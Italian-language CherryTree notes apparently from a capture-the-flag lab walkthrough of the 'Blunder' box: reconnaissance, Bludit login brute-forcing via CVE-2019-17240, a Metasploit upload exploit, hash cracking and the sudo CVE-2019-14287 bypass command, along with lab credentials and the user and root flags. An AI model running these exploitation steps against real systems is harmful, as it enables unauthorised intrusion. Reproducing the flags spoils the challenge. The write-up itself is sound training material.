@@ -1,0 +1,308 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="BLUNDER" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592038851.89" ts_lastsave="1592043904.01" unique_id="1">
+		<rich_text>Blunder (Easy)
+
+IP: 
+</rich_text>
+		<rich_text scale="h2">10.10.10.191</rich_text>
+		<rich_text>
+</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Recognition" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592039026.3" ts_lastsave="1592039083.64" unique_id="2">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="host" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592039034.94" ts_lastsave="1592039041.77" unique_id="3">
+				<rich_text>nmap:   nmap -sC -sV 10.10.10.191
+
+risultato:
+
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="fuzzing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592039083.64" ts_lastsave="1592039091.72" unique_id="4">
+				<rich_text>visto che c'è la porta 80 con un web server e non contiene molte info provo con il fuzzing:
+sudo gobuster  dir -u  </rich_text>
+				<rich_text link="webs http://10.10.10.191/">http://10.10.10.191/</rich_text>
+				<rich_text> -w /usr/share/wordlists/dirb/common.txt -q -n -e -x .php,.html,.txt,.htm,.js,.xml,.svg
+
+
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/.hta">http://10.10.10.191/.hta</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/.htaccess">http://10.10.10.191/.htaccess</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/.htpasswd">http://10.10.10.191/.htpasswd</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/0">http://10.10.10.191/0</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/about">http://10.10.10.191/about</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/admin">http://10.10.10.191/admin</rich_text>
+				<rich_text>           --&gt; contiene pagina di login a BLUDIT
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/cgi-bin/">http://10.10.10.191/cgi-bin/</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/install.php">http://10.10.10.191/install.php</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/LICENSE">http://10.10.10.191/LICENSE</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/robots.txt">http://10.10.10.191/robots.txt</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/server-status">http://10.10.10.191/server-status</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.191/todo.txt">http://10.10.10.191/todo.txt</rich_text>
+				<rich_text>        --&gt; contiene alcune info importanti</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="todo.txt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592039150.08" ts_lastsave="1592039170.17" unique_id="5">
+					<rich_text>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+
+
+
+
+
+questo file da due info importanti: 
+    potrebbe esserci un user che si chiama fergus
+    il cms di bludit non è stato aggiornato quindi potrebbe essere affetto da vuln CVE-2019-17240</rich_text>
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Foothold" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592039265.46" ts_lastsave="1592043230.37" unique_id="6">
+			<rich_text>la pagina di login </rich_text>
+			<rich_text link="webs http://10.10.10.191/admin">http://10.10.10.191/admin</rich_text>
+			<rich_text>   fa riferimento a &quot;Bludit&quot;, un servizio per la creazione di siti web
+che ha un cve che permette di ottenere una shell direttamente in metasploit
+per usare questo exploit però è necessario avere user e pass.
+
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="find_cred" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592043206.88" ts_lastsave="1592043208.65" unique_id="7">
+				<rich_text>Ipotesi di user:
+    admin
+    blunder (nome del sito)
+    bludit (nome del servizio)
+    fergus (dal file todo.txt)
+    
+
+come visto sempre dal file todo.txt il servizio bludit presente potrebbe essere vulnerabile al CVE-2019-17240
+questo permette di fare bruteforce delle credenziali (script -&gt; brute_blunder.py)+
+
+considerando che l'user è molto probabilmente tra quelli riportati e quindi è sul sito, potrebbe esserci anche la pw
+quindi genero una wordlist personalizzata usando cewl:
+
+cewl --with-numbers </rich_text>
+				<rich_text link="webs http://10.10.10.191/">http://10.10.10.191/</rich_text>
+				<rich_text> &gt; wordlist.txt
+
+ottenuta la wordlist si deve eseguire lo script python con user appartenente alla lista di sopra e le password in wordlist.txt
+
+alla fine si ottengono le credenziali:
+
+fergus:RolandDeschain</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592043230.37" ts_lastsave="1592044025.68" unique_id="8">
+				<rich_text>ora che ho ottenuto user e pass posso eseguire l'exploit su metasploit -&gt; linux/http/bludit_upload_images_exec
+
+
+Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   BLUDITPASS  RolandDeschain   yes       The password for Bludit
+   BLUDITUSER  fergus           yes       The username for Bludit
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /           yes       The base path for Bludit
+   VHOST                        no        HTTP server virtual host
+
+
+a questo punto riesco ad ottenere shell meterpreter -&gt;  per ottenere una shell basta scrivere 
+
+shell
+
+nella console meterpreter</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="GetUser" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592043904.01" ts_lastsave="1592048144.64" unique_id="9">
+			<rich_text>la shell ottenuta è con:
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+il file user.txt è nella home dell'user hugo
+
+per prima cosa ottengo una shell con tty:
+
+python </rich_text>
+			<rich_text foreground="#660033">-c</rich_text>
+			<rich_text> </rich_text>
+			<rich_text foreground="#ff0000">'import pty; pty.spawn(&quot;/bin/sh&quot;)'</rich_text>
+			<rich_text>
+
+
+
+andando in / c'è una strana dir  (già nominata nel file todo.txt):
+
+drwxr-xr-x   2 nogroup  4096 Nov 27  2019 ftp
+
+all'interno c'è:
+
+-rw-r--r--  1 root    10899227 Nov 27  2019 D5100_EN.pdf
+-rw-r--r--  1 root      271056 Nov 27  2019 config
+-rw-r--r--  1 root         828 Nov 27  2019 config.json
+-rw-r--r--  1 root         260 Nov 27  2019 note.txt
+
+
+inoltre andando nella dir /var/www troviamo due versioni di bludit:
+
+drwxr-xr-x  8 www-data 4096 May 19 15:13 bludit-3.10.0a
+drwxrwxr-x  8 www-data 4096 Apr 28 12:18 bludit-3.9.2
+
+
+di cui bludit-3.9.2 è quella vulnerabile usata per ottenere accesso
+nella versione più recente invece, sotto:
+
+/var/www/bludit-3.10.0a/bl-content/databases/users.php si trova l'user Hugo (allo stesso path per la versione più vecchia si trovavano admin e fergus
+
+la password presente nel file users.php per hugo è hashata ma con salt , con il sito </rich_text>
+			<rich_text link="webs https://crackstation.net/">https://crackstation.net/</rich_text>
+			<rich_text> si cracca molto velocemente, la password corretta è
+Password120
+
+infatti con su - hugo e inserendo poi la password trovata si riesce ad accedere come hugo
+
+e ottenere il flag di user:
+
+d8626a7e97d67ca64a8f5451f9489f9a
+
+
+
+ </rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="note.txt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592045249.8" ts_lastsave="1592045251.11" unique_id="10">
+				<rich_text>Hey Sophie
+I've left the thing you're looking for in here for you to continue my work
+when I leave. The other thing is the same although Ive left it elsewhere too.
+
+Its using the method we talked about; dont leave it on a post-it note this time!
+
+Thanks
+Shaun
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="config.json" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592045287.67" ts_lastsave="1592045303.97" unique_id="11">
+				<rich_text>{
+  &quot;squadName&quot;: &quot;Super hero squad&quot;,
+  &quot;homeTown&quot;: &quot;Metro City&quot;,
+  &quot;formed&quot;: 2016,
+  &quot;secretBase&quot;: &quot;Super tower&quot;,
+  &quot;active&quot;: true,
+  &quot;members&quot;: [
+    {
+      &quot;name&quot;: &quot;Molecule Man&quot;,
+      &quot;age&quot;: 29,
+      &quot;secretIdentity&quot;: &quot;Dan Jukes&quot;,
+      &quot;powers&quot;: [
+        &quot;Radiation resistance&quot;,
+        &quot;Turning tiny&quot;,
+        &quot;Radiation blast&quot;
+      ]
+    },
+    {
+      &quot;name&quot;: &quot;Madame Uppercut&quot;,
+      &quot;age&quot;: 39,
+      &quot;secretIdentity&quot;: &quot;Jane Wilson&quot;,
+      &quot;powers&quot;: [
+        &quot;Million tonne punch&quot;,
+        &quot;Damage resistance&quot;,
+        &quot;Superhuman reflexes&quot;
+      ]
+    },
+    {
+      &quot;name&quot;: &quot;Eternal Flame&quot;,
+      &quot;age&quot;: 1000000,
+      &quot;secretIdentity&quot;: &quot;Unknown&quot;,
+      &quot;powers&quot;: [
+        &quot;Immortality&quot;,
+        &quot;Heat Immunity&quot;,
+        &quot;Inferno&quot;,
+        &quot;Teleportation&quot;,
+        &quot;Interdimensional travel&quot;
+      ]
+    }
+  ]
+}
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="users.php" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592046912.04" ts_lastsave="1592046926.19" unique_id="12">
+				<rich_text>{
+    &quot;admin&quot;: {
+        &quot;nickname&quot;: &quot;Hugo&quot;,
+        &quot;firstName&quot;: &quot;Hugo&quot;,
+        &quot;lastName&quot;: &quot;&quot;,
+        &quot;role&quot;: &quot;User&quot;,
+        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
+        &quot;email&quot;: &quot;&quot;,
+        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
+        &quot;tokenRemember&quot;: &quot;&quot;,
+        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
+        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
+        &quot;twitter&quot;: &quot;&quot;,
+        &quot;facebook&quot;: &quot;&quot;,
+        &quot;instagram&quot;: &quot;&quot;,
+        &quot;codepen&quot;: &quot;&quot;,
+        &quot;linkedin&quot;: &quot;&quot;,
+        &quot;github&quot;: &quot;&quot;,
+        &quot;gitlab&quot;: &quot;&quot;}
+}
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="PrivEsc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592048144.64" ts_lastsave="1592052394.78" unique_id="13">
+			<rich_text>Ora che ho accesso con hugo devo ottenere permessi di root
+
+
+usando sudo -l si ottiene:
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+
+
+il valore interessante è 
+
+(ALL, !root) /bin/bash
+
+infatti c'è la vuln CVE-2019-14287:
+</rich_text>
+			<rich_text link="webs https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287">https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287</rich_text>
+			<rich_text>
+
+e infatti con sudo -V si ottiene la versione che è 1.8.25p1 ovvero minore della 1.8.28 quindi dovrebbe essere vulnerabile
+
+
+e infatti usando:
+
+sudo -u#-1 /bin/bash -u
+
+si ottiene una console bash come root e si ottiene il codice di root:
+
+f5185721ab5b898d2674948c45a5f770</rich_text>
+		</node>
+	</node>
+</cherrytree>
